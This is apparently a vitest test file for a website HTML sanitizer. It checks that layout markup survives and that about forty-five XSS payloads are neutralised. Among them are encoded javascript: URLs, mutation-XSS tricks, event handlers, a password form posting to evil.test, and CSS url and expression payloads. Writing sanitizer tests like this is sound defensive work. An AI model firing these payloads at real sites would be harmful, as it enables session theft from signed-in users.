/**
 * The website HTML sanitizer is the only thing between a site's layout and the
 * origin people are signed in on. Every case here is an attack that has worked
 * against some sanitizer, or a thing a layout really writes.
 */
import { describe, expect, test } from "vitest";
import { sanitizeSiteHtml, safeSiteHref } from "@context/shared";

const PNG = "data:image/png;base64,iVBORw0KGgo=";
const image = (name: string) => (name === "logo.png" ? PNG : null);
const clean = (html: string) => sanitizeSiteHtml(html, { image }).html;

/** Nothing executable may survive, however it was spelled. */
function assertInert(html: string) {
  expect(html).not.toMatch(/<script|<iframe|<svg|<math|<object|<embed|<form|<input|<textarea|<style|<link|<meta|<base/i);
  expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  expect(html).not.toMatch(/javascript:|vbscript:|data:text/i);
  expect(html).not.toMatch(/srcdoc|srcset|formaction|xlink/i);
}

describe("site HTML sanitizer: what survives", () => {
  test("keeps a layout's structure, classes and links", () => {
    const html = clean(
      '<header class="top"><nav><a href="/music">Music</a></nav><a href="/" class="logo"><img src="logo.png" alt="Supa"></a></header><main>{ content }</main><footer>© Supa</footer>',
    );
    expect(html).toBe(
      `<header class="top"><nav><a href="/music">Music</a></nav><a href="/" class="logo"><img src="${PNG}" alt="Supa"></a></header><main>{ content }</main><footer>© Supa</footer>`,
    );
  });

  test("prefixes ids and the in-page links and aria references that name them", () => {
    expect(clean('<section id="about" aria-labelledby="t1 t2"><a href="#about">Up</a></section>')).toBe(
      '<section id="site-about" aria-labelledby="site-t1 site-t2"><a href="#site-about">Up</a></section>',
    );
  });

  test("a new-tab link always carries noopener", () => {
    expect(clean('<a href="https://x.test" target="_blank" rel="opener">x</a>')).toBe(
      '<a href="https://x.test" target="_blank" rel="noopener noreferrer">x</a>',
    );
    expect(clean('<a href="/a" target="_top">x</a>')).toBe('<a href="/a">x</a>');
  });

  test("lifts <style> and Google Fonts links out for the stylesheet path", () => {
    const result = sanitizeSiteHtml(
      '<head><title>x</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk&display=swap"><link rel="stylesheet" href="https://evil.test/a.css"><style>.a{color:red}</style></head><p>hi</p>',
    );
    expect(result.html).toBe("<p>hi</p>");
    expect(result.styles).toEqual([".a{color:red}"]);
    expect(result.fonts).toEqual(["https://fonts.googleapis.com/css2?family=Space+Grotesk&display=swap"]);
  });

  test("escapes text and attribute values, and decodes entities once", () => {
    expect(clean(`<p title='a"b'>1 &lt; 2 &amp;&amp; <b>x</b> &copy; &bogus;</p>`)).toBe(
      '<p title="a&quot;b">1 &lt; 2 &amp;&amp; <b>x</b> © &amp;bogus;</p>',
    );
  });

  test("balances what it writes and drops stray end tags", () => {
    expect(clean("</div></main><div><p>x<span>y")).toBe("<div><p>x<span>y</span></p></div>");
    expect(clean("<ul><li>a</ul></li>b")).toBe("<ul><li>a</li></ul>b");
  });

  test("keeps template placeholders as text, inside and outside attributes", () => {
    expect(clean('<a class="card" href="{ section.link }">{ section.heading }</a>')).toBe(
      '<a class="card" href="{ section.link }">{ section.heading }</a>',
    );
  });
});

describe("site HTML sanitizer: attacks", () => {
  const attacks = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.test/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\" />",
    "<img/src/onerror=alert(1)>",
    "<body onload=alert(1)>",
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>',
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="java&#x09;script:alert(1)">x</a>',
    '<a href="&#106;avascript:alert(1)">x</a>',
    '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    '<a href="\\\\evil.test">x</a>',
    "<svg><script>alert(1)</script></svg>",
    "<svg onload=alert(1)>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<object data=\"javascript:alert(1)\"></object>",
    "<embed src=\"javascript:alert(1)\">",
    "<form action=\"https://evil.test\"><input name=password><button formaction=javascript:alert(1)>Go</button></form>",
    "<textarea><img src=x onerror=alert(1)></textarea>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
    "<template><img src=x onerror=alert(1)></template>",
    "<div title=\"</div><script>alert(1)</script>\">x</div>",
    "<!--<script>alert(1)</script>-->",
    "<!--><script>alert(1)</script>-->",
    "<scr<script>ipt>alert(1)</script>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<base href=\"javascript:/\">",
    "<img srcset=\"https://evil.test/x.png 1x\">",
    "<img src=\"https://evil.test/pixel.png\">",
    "<img src=\"//evil.test/pixel.png\">",
    "<img src=\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\">",
    "<p style=\"background:url(https://evil.test/x)\">x</p>",
    "<p style=\"width:expression(alert(1))\">x</p>",
    "<div data-ctx-slot=\"content\">x</div>",
    "<plaintext><img src=x onerror=alert(1)>",
    "<a href=\"https://ok.test\" onclick=\"alert(1)\" onmouseover=alert(1)>x</a>",
    "<details open ontoggle=alert(1)>x</details>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<style>@import 'https://evil.test/x.css';</style><p>x</p>",
  ];

  test.each(attacks)("%s", (attack) => {
    const once = clean(attack);
    assertInert(once);
    expect(once).not.toContain("evil.test");
    expect(once).not.toContain("data-ctx");
    // A second pass changes nothing: the output has one reading.
    expect(clean(once)).toBe(once);
  });

  test("a style attribute keeps only safe declarations", () => {
    expect(clean('<p style="color: red; background: url(https://evil.test/x); position: fixed">x</p>')).toBe(
      '<p style="color: red; position: fixed">x</p>',
    );
  });

  test("hrefs keep only safe schemes", () => {
    expect(safeSiteHref("https://supa.media")).toBe("https://supa.media");
    expect(safeSiteHref("mailto:hi@supa.test")).toBe("mailto:hi@supa.test");
    expect(safeSiteHref("/code")).toBe("/code");
    expect(safeSiteHref("about")).toBe("about");
    expect(safeSiteHref("ftp://x")).toBeNull();
    expect(safeSiteHref("javascript\n:alert(1)")).toBeNull();
    expect(safeSiteHref("/\\evil.test")).toBeNull();
  });

  test("an unknown tag is dropped and its words kept", () => {
    expect(clean("<center><font color=red>Hi</font></center><button>Go</button>")).toBe("HiGo");
  });

  test("output is bounded", () => {
    expect(clean(`<div>${"x".repeat(400_000)}</div>`)).toBe("");
    const deep = "<div>".repeat(500) + "x";
    expect((clean(deep).match(/<div>/g) ?? []).length).toBe(200);
  });
});
